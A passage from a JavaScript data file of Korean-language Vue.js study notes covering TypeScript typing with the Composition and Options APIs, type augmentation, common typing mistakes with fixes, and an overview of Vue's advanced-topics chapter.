'x' })        // 변수에 주석 (제네릭 X)\nconst double = computed<number>(() => year.value as number * 2)\n\n// 핸들러\nfunction onInput(e: Event) { (e.target as HTMLInputElement).value }\n\n// provide / inject\nconst ThemeKey = Symbol() as InjectionKey<string>\nconst theme = inject(ThemeKey, 'light')            // string\n\n// 템플릿 ref\nconst input = useTemplateRef<HTMLInputElement>('input')   // 3.5+\nconst modal = useTemplateRef<InstanceType<typeof MyModal>>('modal')\n</script>",
        terms: [
          {
            term: "타입 기반 선언 (type-based declaration)",
            body: "defineProps<{ … }>()처럼 제네릭 인자로 props 타입을 적는 방식입니다. Vue 컴파일러가 그 타입 리터럴을 읽어 런타임 선언(type·required)으로 바꾸므로(실제로 msg?: string → { type: String, required: false }) 타입과 런타임 검증이 한 번에 됩니다. 제약은 컴파일러가 '정적으로 읽을 수 있는' 타입이어야 한다는 것입니다. 3.3+부터 import한 인터페이스도 되지만 조건부 타입 같은 계산은 안 됩니다. 런타임 선언과 섞으면 컴파일 에러입니다.",
          },
          {
            term: "InjectionKey<T>",
            body: "Symbol에 '이 키로 provide/inject되는 값의 타입은 T'를 붙이는 유틸 타입입니다. const key = Symbol() as InjectionKey<string>로 만들면 provide(key, 123)은 타입 에러, inject(key)는 string | undefined가 됩니다. 문자열 키는 타입을 못 실어 inject<string>('key')로 손으로 적어야 합니다. 키를 별도 파일에서 export해 공급자와 소비자가 같은 키를 import하는 것이 관례입니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Node의 compileScript에 <script setup lang=\"ts\">를 주었습니다. const { msg = 'hi', count } = defineProps<{ msg?: string; count: number }>()는 props: { msg: { type: String, required: false, default: 'hi' }, count: { type: Number, required: true } }. 옵셔널 ?가 required: false로, string이 String으로, 구조 분해 기본값이 default로. defineModel<string>({ required: true })는 modelValue: { type: String, ...{ required: true } }. defineEmits<{ change: [id: number] }>()는 emits: [\"change\"](런타임에는 이름만). 템플릿의 msg는 __props.msg, watch(() => count)는 watch(() => __props.count). watch(count)로 구조 분해 변수를 직접 넘기니 '[@vue/compiler-sfc] \"count\" is a destructured prop and should not be passed directly to watch(). Pass a getter () => count instead.' 컴파일 에러. 이것은 TS가 아니라 Vue 컴파일러의 검사입니다. 출력에 setup(__props: any, …)처럼 TS 주석이 남아 다음 단계(esbuild)가 지웁니다. Chrome의 런타임 측정에서 타입 기반 선언으로 만들어진 required·type이 개발 모드 경고('Missing required prop', 'type check failed')를 내는 것이 컴포넌트 기초 노드의 측정과 같은 메커니즘입니다.",
        code: "// compileScript · lang=\"ts\" (vue 3.5.45)\nconst { msg = 'hi', count } = defineProps<{ msg?: string; count: number }>()\n→ props: { msg: { type: String, required: false, default: 'hi' }, count: { type: Number, required: true } }\n   msg?: string → required: false · string → String · 구조 분해 = → default\ndefineModel<string>({ required: true }) → \"modelValue\": { type: String, ...{ required: true } }\ndefineEmits<{ change: [id: number] }>() → emits: [\"change\"]\n템플릿 msg → __props.msg · watch(() => count) → watch(() => __props.count)\nwatch(count) → error: \"count\" is a destructured prop and should not be passed directly to watch(). Pass a getter () => count instead.\n\n// 런타임: 그 선언이 개발 경고를 낸다 (컴포넌트 기초 노드)\n'Missing required prop: \"required\"' · 'type check failed for prop \"count\". Expected Number…'",
      },
      {
        label: "문제: inject 한 값이 늘 'possibly undefined' 다",
        body: "const store = inject('store')로 받아 store.user를 쓰니 TS가 'store' is possibly 'undefined'(그리고 any)라고 합니다. 문자열 키는 타입을 싣지 못하고, inject는 제공자가 없을 수 있어 undefined를 포함합니다. 처방은 InjectionKey입니다. 공유 파일에 export const StoreKey = Symbol() as InjectionKey<Store>를 두고 provide(StoreKey, store), const store = inject(StoreKey). 그래도 Store | undefined이니 셋 중 하나로 undefined를 뗍니다. 기본값 inject(StoreKey, defaultStore), 단언 inject(StoreKey)!(또는 as Store. 제공이 보장될 때), 또는 컴포저블 useStore()가 inject하고 없으면 throw해 호출 쪽은 Store만 받게. 문서는 '키를 별도 파일에서 export'를 권합니다.",
      },
      {
        label: "문제가 나는 경우: 자리별 표기를 틀릴 때",
        body: "경우 ㄱ, 문자열 키 inject입니다. 위의 사고입니다. 경우 ㄴ, 타입 기반과 런타임 선언 동시. 컴파일 에러. 하나. 경우 ㄷ, 조건부 타입을 props에. 불가. 평탄한 인터페이스. 경우 ㄹ, 3.2 이하에서 import한 타입. 불가(3.3+). 로컬 인터페이스. 경우 ㅁ, withDefaults에 참조 타입 기본값을 값으로. 공유. 팩토리(3.5 구조 분해는 불필요). 경우 ㅂ, reactive<Book>() 제네릭. 중첩 ref 타입 어긋남(비권장). 변수 주석. 경우 ㅅ, ref<number>()를 Ref<number>로 믿음. undefined 포함. 초깃값 또는 ! 검사. 경우 ㅇ, 이벤트 핸들러 매개변수 주석 없음. any. (e: Event) + 캐스팅. 경우 ㅈ, 3.5 전 템플릿 ref에 null 처리 없음. ref<T | null>(null)과 ?. 경우 ㅊ, 제네릭 컴포넌트에 InstanceType. 안 됨. ComponentExposed. 경우 ㅋ, 구조 분해 prop을 watch·컴포저블에 값으로. 컴파일 에러·끊김(실제로). getter. 경우 ㅌ, emits 호출 시그니처와 튜플 혼용. 하나로. 경우 ㅍ, 전역 디렉티브 타입 없음. 템플릿 에러. GlobalDirectives 증강.",
        code: "경우               언제 생기나                        겉모습                          처방\nㄱ 문자열 키        inject('store')                     any | undefined                  InjectionKey<T> · 기본값/!\nㄴ 선언 동시        defineProps<T>({…})                  컴파일 에러                       하나\nㄷ 조건부 타입       Props = A extends B ? …              불가                            평탄 인터페이스\nㄹ 3.2 import 타입   import type Props                   불가                            3.3+ · 로컬\nㅁ 참조 기본값       withDefaults(…, { tags: [] })        공유                            () => [] · 3.5 구조 분해\nㅂ reactive 제네릭    reactive<Book>({…})                 타입 어긋남 (비권장)               const b: Book = reactive\nㅅ ref<T>()        초깃값 없음                          Ref<T | undefined>               초깃값 · 검사\nㅇ 핸들러 any       (e) => e.target.value               any                             (e: Event) + as\nㅈ 템플릿 ref null   3.5 전 ref(null)                    null 가능                        ref<T | null> · ?.\nㅊ 제네릭 InstanceType  InstanceType<typeof G>            안 됨                           ComponentExposed\nㅋ 구조 분해 값 전달   watch(count)                       compile error (실제로)            () => count\nㅌ emits 혼용       시그니처 + 튜플                      에러                            하나\nㅍ 디렉티브 타입      v-highlight                        템플릿 에러                       GlobalDirectives",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 표기는 '컴파일러가 읽는 것' 과 'TS 만 읽는 것' 으로 갈리고, 둘의 경계가 제약이다",
        body: "Composition API의 타입 표기는 두 종류입니다. Vue 컴파일러가 읽어 런타임으로 바꾸는 것: defineProps<T>·defineEmits<T>·defineModel<T>의 제네릭(실제로 런타임 선언으로), 구조 분해 기본값, generic 속성. 그래서 '정적으로 읽을 수 있어야'(조건부 타입 ㄷ, 3.2의 import ㄹ, 동시 선언 ㄴ) 하고 컴파일러가 치환하는 변수는 값으로 못 넘깁니다(ㅋ). TS만 읽는 것: Ref<T>·reactive 변수 주석·computed<T>·InjectionKey<T>·핸들러 매개변수·useTemplateRef<T>. 런타임에는 아무 영향이 없고 추론의 빈틈(undefined ㄱ, ㅅ, ㅈ · any ㅇ · 제네릭 인스턴스 ㅊ)을 사람이 메웁니다. 처방은 props·emits·model은 매크로 제네릭으로(런타임 검증까지), 나머지는 TS 유틸 타입으로, undefined는 기본값·단언·throw 중 하나로 명시하는 것입니다.",
        code: "Vue 컴파일러가 읽음 (→ 런타임 선언)     defineProps<T> · defineEmits<T> · defineModel<T> · 구조 분해 기본값 · generic=\"T\"\n                                      제약: 정적으로 읽혀야 (ㄴ ㄷ ㄹ) · 치환 변수는 값으로 X (ㅋ)\nTS 만 읽음 (런타임 무관)                Ref<T> · const x: T = reactive · computed<T> · InjectionKey<T> · (e: Event) · useTemplateRef<T> · ComponentExposed\n                                      빈틈: undefined (ㄱ ㅅ ㅈ) · any (ㅇ) · 제네릭 인스턴스 (ㅊ) → 기본값 · ! · throw",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "같은 일을 Options API에서 하는 법이 다음 페이지 'Options API와 TS'입니다. defineComponent와 PropType, 그리고 전역 프로퍼티 타입 증강.",
      },
      {
        label: "확인 질문",
        body: "(1) <Select v-model=\"value\" :options>에서 options의 타입에 따라 value 타입이 정해지게 하려면? (2) 모달 컴포넌트의 open() 메서드를 부모가 템플릿 ref로 부르려는데 타입이 any입니다. (3) useFetch<T>(url) 컴포저블의 반환 타입과 인자 타입은?",
        notes: [
          {
            title: "답",
            body: "(1) 제네릭 컴포넌트입니다. <script setup lang=\"ts\" generic=\"T extends string | number\">와 const model = defineModel<T>(); defineProps<{ options: { value: T; label: string }[] }>(). 호출 쪽이 :options=\"[{ value: 1, … }]\"를 넘기면 T가 number로 추론되어 v-model의 value도 number여야 합니다. 템플릿 ref로 이 컴포넌트 인스턴스를 잡을 때는 ComponentExposed를 씁니다. (2) 자식이 defineExpose({ open })를 했는지 먼저(안 했으면 런타임에도 undefined. 실제로 expose 안 한 것은 undefined). 타입은 const modal = useTemplateRef<InstanceType<typeof Modal>>('modal')(3.5+)로 주면 modal.value?.open()이 타입을 갖습니다. 3.5 전은 ref<InstanceType<typeof Modal> | null>(null). Modal이 제네릭이면 InstanceType이 안 되니 vue-component-type-helpers의 ComponentExposed<typeof Modal>. (3) export function useFetch<T>(url: MaybeRefOrGetter<string>): { data: Ref<T | null>; error: Ref<Error | null> }. 인자는 MaybeRefOrGetter<string>(3.3+ 유틸 타입)로 문자열·ref·getter를 모두 받고 안에서 toValue(url). 반환은 ref 묶음이라 호출 쪽이 const { data } = useFetch<Post[]>('/api/posts')로 받으면 data가 Ref<Post[] | null>. 호출 시 T를 명시하거나 스키마 파서(zod)의 반환 타입에서 추론하게 합니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "TypeScript with Composition API", href: `${DOCS}/guide/typescript/composition-api` },
      { label: "Utility Types", href: `${DOCS}/api/utility-types` },
      { label: "defineProps / defineEmits (Type-only)", href: `${DOCS}/api/sfc-script-setup#type-only-props-emit-declarations` },
    ],
  },

  {
    id: "vg-ts-options",
    name: "Options API와 TS",
    tagline: "defineComponent 로 감싸고 PropType 으로 적는다 — 전역 프로퍼티 타입은 모듈 파일에서 증강한다",
    intro:
      "TypeScript 장의 마지막 페이지입니다. 문서의 첫 팁은 'TS와 함께라면 Composition API를 권장'이지만 Options API도 됩니다. defineComponent()로 감싸면 props·data·computed·methods의 this 타입이 추론됩니다. 복잡한 prop 타입은 type: Object as PropType<Book>, Function as PropType<(id: number) => void>. TS 4.7 미만에서는 validator·default를 화살표 함수로(this 추론 문제). emits 객체 문법으로 페이로드 타입, 미선언 이벤트는 타입 에러. computed는 반환 타입 주석(greeting(): string. 순환 추론 방지). 이벤트 핸들러는 (event: Event)와 캐스팅. 전역 프로퍼티는 declare module 'vue' { interface ComponentCustomProperties { $http: typeof axios } }, 커스텀 옵션은 ComponentCustomOptions. 배치 주의: '파일에 최상위 import나 export가 하나는 있어야 한다(export {} 라도). 모듈 밖에 두면 원래 타입을 덮어쓴다'. 전역 디렉티브 타입은 Composition 페이지와 같습니다. 이 노드는 돌려 본 측정이 없고(타입 전용), Options API의 런타임 측정(data의 $·_ 접두, mounted의 $el, this 바인딩)은 참고서 노드에 있습니다. 이 노드의 질문은 하나입니다. this 의 타입을 누가 알려 주나.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "'Vue + TS는 Composition API 권장'(팁). Options API: export default defineComponent({ props: { name: String, id: [Number, String], msg: { type: String, required: true }, metadata: null }, mounted() { this.name /* string | undefined */; this.id /* number | string | undefined */; this.msg /* string */; this.metadata /* any */ } }). 복잡 타입: import type { PropType } from 'vue'; props: { book: { type: Object as PropType<Book>, required: true }, callback: Function as PropType<(id: number) => void> }. 주의: 'TS 4.7 미만이면 validator·default에 화살표 함수를 쓸 것(this 추론 실패). 4.7에서 고쳐짐'. emits: emits: { addBook(payload: { bookName: string }) { return payload.bookName.length > 0 } }로 페이로드 타입. '선언 안 된 이벤트를 emit하면 타입 에러'. computed: 추론되지만 greeting(): string 주석 권장(순환 참조 시 필요). 쓰기 가능은 get()/set() 둘 다 주석. 핸들러: handleChange(event: Event) { console.log((event.target as HTMLInputElement).value) }. 전역 프로퍼티: app.config.globalProperties.$http = axios 뒤 declare module 'vue' { interface ComponentCustomProperties { $http: typeof axios; $translate: (key: string) => string } }. '타입 증강은 모듈 파일(.ts·.d.ts)에 두고 그 파일에 최상위 import/export가 하나는 있어야. 모듈 밖에 두면 원래 타입을 덮어씀'. 커스텀 옵션(vue-router의 beforeRouteEnter): declare module 'vue' { interface ComponentCustomOptions { beforeRouteEnter?(to: any, from: any, next: () => void): void } }. 같은 배치 제약.",
        code: "import { defineComponent } from 'vue'\nimport type { PropType } from 'vue'\n\nexport default defineComponent({\n  props: {\n    book: { type: Object as PropType<Book>, required: true },      // 복잡 타입\n    onDone: Function as PropType<(id: number) => void>,\n    msg: { type: String, required: true },\n  },\n  emits: { addBook(payload: { bookName: string }) { return payload.bookName.length > 0 } },   // 페이로드 타입\n  data() { return { count: 0 } },\n  computed: { greeting(): string { return `Hello ${this.msg}` } },   // 반환 주석\n  methods: { onInput(e: Event) { (e.target as HTMLInputElement).value } },\n  mounted() { this.book.title; this.count++; this.$emit('addBook', { bookName: 'x' }) },\n})\n\n// 전역 프로퍼티 증강 — 모듈 파일에 (import/export 하나 필수)\n// src/types/vue.d.ts\nimport axios from 'axios'\ndeclare module 'vue' {\n  interface ComponentCustomProperties { $http: typeof axios; $translate: (key: string) => string }\n  interface ComponentCustomOptions { beforeRouteEnter?(to: any, from: any, next: () => void): void }\n}\nexport {}   // 모듈로 만들기",
        terms: [
          {
            term: "PropType<T>",
            body: "런타임 prop 선언의 type: Object·Array·Function이 TS에는 너무 넓을 때, as PropType<T>로 '런타임 검사는 Object로 하되 TS에는 T로 보라'고 좁히는 유틸 타입입니다. type: Object as PropType<Book>이면 런타임은 객체인지만 검사하고 setup(props)·this.book은 Book입니다. Composition API의 런타임 선언에도 같이 씁니다. 타입 기반 defineProps<T>()가 가능하면 그쪽이 간결합니다.",
          },
          {
            term: "타입 증강 (type augmentation)의 배치",
            body: "declare module 'vue' { interface ComponentCustomProperties { … } }는 Vue가 export한 인터페이스에 멤버를 '더하는' 선언 병합입니다. 파일이 모듈(최상위 import/export가 있는)이어야 병합이고, 스크립트 파일(없음)에 두면 declare module이 '새 모듈 선언'으로 해석되어 Vue의 원래 타입을 덮어씁니다. 그래서 문서가 export {}라도 두라고 적습니다. .d.ts를 tsconfig include에 넣어야 합니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면: Options API 의 런타임 쪽",
        body: "이 페이지는 타입 전용이라 런타임 측정이 없습니다. Options API 자체의 런타임 측정은 이렇습니다. data()에 $a와 _b를 넣으니 this.$a는 undefined(프록시 안 됨), this._b는 2로 읽혔지만 문서는 둘 다 예약이라 피하라고 합니다. mounted에서 루트 하나면 this.$el은 그 요소(P), 루트 둘이면 텍스트 노드(자리표시). template 문자열 Options 컴포넌트({ data, template })가 서버에서 렌더됐습니다. 타입 쪽에서 defineComponent가 하는 일은 이 this에 props·data·computed·methods의 타입을 합치는 것이고, 그 추론이 strict(noImplicitThis) 없이는 this가 any가 됩니다(개요 노드). Composition 노드에서 본 대로 defineProps<T>의 타입 → 런타임 변환은 <script setup> 전용이고, Options API에서는 PropType으로 사람이 둘을 맞춥니다.",
        code: "// Options API 런타임 (Chrome 156 · vue 3.5.45)\ndata: () => ({ $a: 1, _b: 2, c: 3 })   → this.$a undefined · this._b 2 · this.$data._b 2   (문서: $·_ 예약)\nmounted() { this.$el }                 → 루트 하나: P · 루트 둘: 텍스트 노드 (자리표시)\n{ data, template: '<button @click=\"n++\">{{ n }}</button>' }  → 서버 렌더 <button>1</button>\n\n// 타입 쪽\ndefineComponent → this 에 props · data · computed · methods 합침 (strict 없으면 any)\nPropType<T>    → 런타임 Object + TS 의 T 를 사람이 맞춤 (<script setup> 의 defineProps<T> 는 컴파일러가 맞춤)",
      },
      {
        label: "문제: $http 타입 증강을 넣자 this 의 모든 타입이 사라진다",
        body: "src/vue.d.ts에 declare module 'vue' { interface ComponentCustomProperties { $http: typeof axios } }만 적었습니다. 그 뒤 this.count, this.$emit 전부 any이거나 에러입니다. 파일에 최상위 import/export가 없어 스크립트 파일로 처리되고, declare module 'vue'가 '증강'이 아니라 'vue 모듈 전체를 이 선언으로 대체'가 됐습니다. 문서의 경고 그대로입니다. 처방은 파일을 모듈로 만드는 것입니다. import axios from 'axios'가 있으면 이미 모듈이고, 없으면 export {}를 추가합니다. tsconfig의 include에 그 .d.ts가 들어 있는지 확인합니다. ComponentCustomOptions도 같은 규칙입니다.",
      },
      {
        label: "문제가 나는 경우: 추론의 조건을 놓칠 때",
        body: "경우 ㄱ, 증강을 스크립트 파일에입니다. 위의 사고입니다. 경우 ㄴ, defineComponent 없이 export default {}. this 추론 없음. 감싸기. 경우 ㄷ, strict 없음. this가 any. noImplicitThis. 경우 ㄹ, type: Object만. this.book이 Record<string, any>. PropType<Book>. 경우 ㅁ, TS 4.7 미만에서 일반 함수 validator. this 추론 실패. 화살표. 경우 ㅂ, computed 순환 참조로 추론 실패. 반환 타입 주석. 경우 ㅅ, emits 배열 문법으로 페이로드 타입 기대. 이름만. 객체 문법. 경우 ㅇ, 미선언 이벤트 emit. 타입 에러(문서). 선언. 경우 ㅈ, 핸들러 event 주석 없음. any. (event: Event). 경우 ㅊ, .d.ts가 include에 없음. 증강 미적용. tsconfig. 경우 ㅋ, globalProperties 값만 넣고 타입 증강 안 함. 템플릿·this에서 에러. 증강. 경우 ㅌ, Options와 Composition 혼용 시 setup 반환값 타입. setup()이 돌려준 것도 this에 합쳐짐(됨). 경우 ㅍ, TS 쓰는데 Options API 고집. 가능하지만 권장은 Composition.",
        code: "경우               언제 생기나                        겉모습                          처방\nㄱ 스크립트 증강     import/export 없는 .d.ts            원래 타입 덮어씀                   export {}\nㄴ defineComponent 없음  export default { … }           this 추론 없음                    감싸기\nㄷ strict 없음      noImplicitThis 없음                 this any                        strict\nㄹ Object 만        type: Object                       Record<string, any>              PropType<T>\nㅁ TS < 4.7        일반 함수 validator                 this 추론 실패                    화살표\nㅂ computed 순환     추론 실패                           any                             greeting(): string\nㅅ 배열 emits       emits: ['x']                       페이로드 any                      객체 문법\nㅇ 미선언 emit      $emit('nope')                      타입 에러                        선언\nㅈ 핸들러 any       (e) => …                           any                             (e: Event)\nㅊ include 누락     .d.ts 밖                            증강 미적용                       tsconfig include\nㅋ 타입 없는 전역    globalProperties 만                  에러                            ComponentCustomProperties\nㅌ 혼용 this       setup + options                     (됨)                            -\nㅍ Options 고집     TS                                 가능                            Composition 권장",
        codeLang: "text",
      },
      {
        label: "문제의 구조: Options API 의 타입은 전부 'this 에 무엇이 있나' 로 모이고, 그것을 알려 주는 것이 defineComponent 와 증강이다",
        body: "Options API는 모든 것을 this로 읽습니다. 그래서 타입의 질문은 하나, 'this에 어떤 멤버가 어떤 타입으로 있나'입니다. defineComponent가 props(PropType으로 좁힘 ㄹ)·data·computed(주석 ㅂ)·methods·emits(객체 문법 ㅅ, ㅇ)를 합쳐 this 타입을 만들고(ㄴ), strict가 있어야 그 타입이 any로 풀리지 않습니다(ㄷ). 플러그인이 더한 $http나 라우터의 커스텀 옵션은 Vue가 모르니 ComponentCustomProperties·ComponentCustomOptions 증강으로 this에 더하고(ㅋ), 증강은 모듈 파일에서 선언 병합이어야 덮어쓰지 않습니다(ㄱ, ㅊ). Composition API가 TS와 더 잘 맞는 이유는 this 없이 변수 하나하나가 자기 타입을 들고 있기 때문입니다(ㅍ). 처방은 defineComponent + strict + PropType + 객체 emits + 모듈 파일 증강입니다.",
        code: "this = props (PropType ㄹ) + data + computed (주석 ㅂ) + methods + emits (객체 ㅅ ㅇ) + setup 반환 (ㅌ)\n     + ComponentCustomProperties ($http ㅋ) + ComponentCustomOptions (증강 — 모듈 파일 ㄱ ㅊ)\n알려 주는 것: defineComponent (ㄴ) · strict (ㄷ)\nComposition 은 this 없이 변수마다 타입 → TS 와 더 잘 맞음 (ㅍ)",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "TypeScript 장이 끝났습니다. 다음 장 '추가 주제'는 '왜'의 장입니다. Vue 사용 방법, Composition API FAQ, 반응성 심화, 렌더링 메커니즘, 렌더 함수와 JSX, 웹 컴포넌트, 애니메이션 기법. 실제로 돌려 보면 반응성 추적이 await 뒤에 끊기는 것, 컴파일 출력의 패치 플래그와 정적 캐시를 확인했습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) Options API 컴포넌트에서 this.$route가 any입니다. 왜고 어떻게? (2) props: { items: Array }인데 this.items[0].name이 any입니다. (3) 레거시 Options 컴포넌트 수십 개를 TS로 옮깁니다. 최소 변경은?",
        notes: [
          {
            title: "답",
            body: "(1) Vue Router가 globalProperties에 $route를 넣었지만 TS는 ComponentCustomProperties에 그 멤버가 있어야 압니다. vue-router 패키지는 자기 타입 증강을 포함하므로 보통 import 'vue-router'가 어디선가 되면 적용됩니다. 안 되면 tsconfig의 types/include에 vue-router가 들어가는지, 사내 플러그인이면 declare module 'vue' { interface ComponentCustomProperties { $route: RouteLocationNormalized } }를 export {}가 있는 .d.ts에 추가합니다. (2) type: Array는 TS에 unknown[]/any[]라 요소 타입이 없습니다. items: { type: Array as PropType<Item[]>, required: true }로 좁힙니다. 런타임 검사는 그대로 Array이고 TS만 Item[]을 봅니다. (3) 각 컴포넌트를 defineComponent(…)로 감싸고 <script lang=\"ts\">로 바꾸면 this의 props·data·computed·methods가 추론됩니다. tsconfig에 strict(최소 noImplicitThis)와 isolatedModules. Object·Array·Function prop에 PropType을 붙이고, emits를 객체 문법으로 바꿔 페이로드 타입을 적습니다. 전역 프로퍼티는 모듈 .d.ts에서 증강. 그 뒤 새 컴포넌트는 <script setup lang=\"ts\">로 쓰고 점진적으로 옮깁니다(문서의 권장 방향).",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "TypeScript with Options API", href: `${DOCS}/guide/typescript/options-api` },
      { label: "PropType · ComponentCustomProperties (Utility Types)", href: `${DOCS}/api/utility-types` },
      { label: "defineComponent()", href: `${DOCS}/api/general#definecomponent` },
    ],
  },

  {
    id: "vg-extras",
    name: "추가 주제",
    tagline: "'왜' 의 장: 쓰는 방식의 폭, Composition API 의 이유, 반응성과 렌더링의 내부, 렌더 함수, 웹 컴포넌트, 애니메이션",
    intro:
      "가이드의 마지막 장, 일곱 페이지입니다. Vue 사용 방법(스크립트 하나부터 SSR·SSG·네이티브까지), Composition API FAQ(왜·Options와의 관계·React 훅과 비교), 반응성 심화(Proxy track/trigger, 디버깅, 외부 상태, 시그널), 렌더링 메커니즘(가상 DOM, 컴파일러 정보 기반 패치 플래그·정적 캐시·트리 평탄화), 렌더 함수와 JSX(h(), 디렉티브 대응, 함수형 컴포넌트), Vue와 웹 컴포넌트(isCustomElement·defineCustomElement), 애니메이션 기법(클래스·상태·감시자 기반). 앞 장들이 '어떻게'라면 이 장은 그것이 그렇게 동작하는 '왜'입니다. 실제로 돌려 보면 컴파일 출력에 정적 캐시(-1 CACHED)·패치 플래그(TEXT·CLASS·KEYED_FRAGMENT)·핸들러 캐시가 보였고, watchEffect는 첫 await까지만 추적했고, reactive(raw) === reactive(raw)·toRaw가 정체를 보여 줬습니다.",
    blocks: [
      {
        label: "일곱 페이지 한눈에",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "페이지              핵심 한 줄                                                   실제로 돌려 본 것\n1 Vue 사용 방법       스크립트 하나(petite-vue) · 웹 컴포넌트 · SPA · SSR · SSG · 데스크톱/모바일/WebGL/터미널   CDN esm-browser 로 측정 · SSR renderToString\n2 Composition API FAQ  로직 재사용 · 조직 · 타입 · 번들 · Options 는 그 위 · 폐기 계획 없음 · React 훅과 차이   setup 1회 · 의존성 배열 없음 (watchEffect 자동 추적)\n3 반응성 심화         Proxy get→track · set→trigger · WeakMap<target, Map<key, Set<effect>>> · 디버깅 훅 · 시그널    reactive(raw)===reactive(raw) · toRaw · await 뒤 미추적 · computed 안정성\n4 렌더링 메커니즘      컴파일 → 마운트 → 패치 · 정적 캐시 · 패치 플래그 · 트리 평탄화(블록)                     -1 CACHED · 3 TEXT,CLASS · 128 KEYED_FRAGMENT · 512 NEED_PATCH\n5 렌더 함수와 JSX     h(type, props, children) · vnode 유일 · 슬롯은 함수 · withDirectives · 함수형 컴포넌트      h() 로 전부 측정 · resolveComponent 경고\n6 Vue 와 웹 컴포넌트   isCustomElement (컴파일 옵션) · .prop · defineCustomElement · 섀도 DOM · .ce.vue             <my-el class> 서버 렌더 (객체 prop 미출력)\n7 애니메이션 기법      클래스 토글 · 상태 기반 :style · 감시자 + gsap                                           (Transition 노드 측정)",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 내부를 알면 앞 장의 '규칙' 이 '결과' 가 된다",
        body: "구조 분해가 끊기는 이유(Proxy의 get이 안 불림), computed가 캐시되는 이유(effect의 dirty 플래그), 정적 노드가 비교되지 않는 이유(패치 플래그), v-if·v-for가 블록을 만드는 이유(트리 평탄화), 슬롯이 지연 평가되는 이유(함수), 템플릿이 JSX보다 빠를 수 있는 이유(컴파일러가 정적 분석). 자식 일곱이 각각입니다.",
      },
      {
        label: "다음 입구",
        body: "첫 페이지 'Vue 사용 방법'부터입니다.",
      },
    ],
    sources: [
      { label: "Reactivity in Depth", href: `${DOCS}/guide/extras/reactivity-in-depth` },
      { label: "Rendering Mechanism", href: `${DOCS}/guide/extras/rendering-mechanism` },
    ],
  },

  {
    id: "vg-extra-ways",
    name: "Vue 사용 방법",
    tagline: "스크립트 하나에서 SSR·SSG·네이티브까지 — 점진적 프레임워크의 스펙트럼",
    intro:
      "추가 주제 첫 페이지입니다. '하나의 크기가 전부에 맞지는 않는다'. Vue를 쓰는 방식의 스펙트럼: 독립 스크립트(빌드 없이 <script>로. jQuery의 선언적 대체. petite-vue는 '더 이상 활발히 유지되지 않음, 마지막 3.2.27'), 임베디드 웹 컴포넌트(어느 HTML 페이지에나 끼울 표준 Web Components), SPA(클라이언트 라우터·빌드·DevTools·TS·테스트. Inertia.js로 백엔드 결합), 풀스택 SSR(서버에서 HTML 문자열로 렌더 뒤 하이드레이션. LCP 개선), JAMStack/SSG(빌드 때 HTML. 단일 페이지 SSG는 SPA로 하이드레이션, 다중 페이지 SSG는 최소 JS. Astro 아일랜드. VitePress), 웹 너머(Electron·Wails 데스크톱, Ionic Vue·Quasar·Tauri 모바일, TresJS WebGL, 커스텀 렌더러로 터미널 vue-termui). 이 블로그의 측정 자체가 스펙트럼의 두 끝입니다. CDN의 esm-browser 빌드로 빌드 없이(독립 스크립트), Node의 @vue/server-renderer로(SSR). 이 노드의 질문은 하나입니다. 이 프로젝트는 스펙트럼의 어디인가.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "독립 스크립트: '빌드 없이 <script> 하나로. 서버 렌더 HTML을 점진 강화. jQuery의 더 선언적인 대체'. petite-vue(6kb)가 이 용도로 최적화됐지만 '3.2.27 이후 활발히 유지되지 않음'. 임베디드 웹 컴포넌트: Vue로 표준 Web Components를 빌드해 '어느 HTML 페이지에나, 어느 프레임워크와도'. SPA: 복잡한 상호작용·깊은 세션·많은 상태. 클라이언트 라우팅, 빌드 도구, DevTools, TS, 테스트. 백엔드가 있으면 Inertia.js로 SPA 이점을 유지하며 서버 중심 개발. 풀스택/SSR: SPA는 빈 HTML을 받아 JS 뒤에 그려 LCP가 늦음. SSR은 '서버에서 Vue 앱을 HTML 문자열로 렌더하는 1급 API'를 제공하고 클라이언트가 하이드레이션. Nuxt가 이 용도. JAMStack/SSG: 데이터가 빌드 때 정해지면 미리 렌더해 CDN. 단일 페이지 SSG(하이드레이션 뒤 SPA)와 다중 페이지 SSG(최소 JS. Astro의 아일랜드). VitePress가 Vue 팀의 SSG. 웹 너머: Electron·Wails(데스크톱), Ionic Vue·Quasar·Tauri(모바일·데스크톱), TresJS(WebGL), 커스텀 렌더러 API(터미널 vue-termui).",
        code: "스펙트럼 (가벼움 → 무거움)\n독립 스크립트     <script src=\"vue.global.js\">  ·  서버 HTML 점진 강화  ·  Options API  ·  (petite-vue: 미유지)\n임베디드 WC      defineCustomElement → <my-widget>  ·  어느 페이지·프레임워크에나\nSPA             create-vue · Vue Router · Pinia  ·  풍부한 상호작용  ·  (Inertia.js 로 백엔드 결합)\n풀스택 SSR       Nuxt  ·  서버 HTML + 하이드레이션  ·  LCP · SEO\nSSG / JAMStack   VitePress · Nuxt generate  ·  빌드 때 HTML  ·  단일 페이지 (SPA 수화) / 다중 페이지 (최소 JS · 아일랜드)\n웹 너머          Electron · Wails · Ionic · Quasar · Tauri · TresJS · 커스텀 렌더러 (터미널)",
        codeLang: "text",
        terms: [
          {
            term: "점진적 프레임워크 (progressive framework)",
            body: "한 페이지의 버튼 하나에서 풀스택 앱까지, 필요한 만큼만 가져다 쓸 수 있다는 뜻입니다. 같은 컴포넌트 모델과 반응성이 모든 크기에서 같고, 빌드·라우터·SSR은 선택입니다. 실제로 이 블로그는 빌드 없이 esm-browser 빌드로 측정했고 Node에서 서버 렌더했습니다. 둘이 같은 vue 패키지입니다. 어디서 시작하든 다음 단계로 옮길 때 다시 배우지 않는 것이 이 설계의 약속입니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면: 스펙트럼의 두 끝을 같은 패키지로",
